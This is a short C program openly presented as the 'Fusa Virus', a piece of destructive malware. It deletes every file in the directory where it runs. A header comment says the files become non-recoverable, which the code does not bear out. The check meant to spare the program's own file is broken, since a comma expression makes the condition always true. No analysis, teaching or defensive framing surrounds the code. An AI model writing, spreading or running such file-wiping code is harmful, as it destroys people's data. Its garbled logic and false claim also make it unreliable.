/** Fusa Virus
* From the Japanese word 封鎖 (fusa) which means
* "lockdown" or "blockade"
* The virus deletes all files in a directory and makes them non-recoverable
*/

#include <stdio.h>
#include <dirent.h>

int main(void)
{
    puts("Fusa is looking for files");
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {
            //delete files
            if("%s" != "fusa", dir->d_name)
            {
                printf("Deleting: %s\n", dir->d_name);
                remove(dir->d_name);
            }
        }
        closedir(d);
    }
    return(0);
}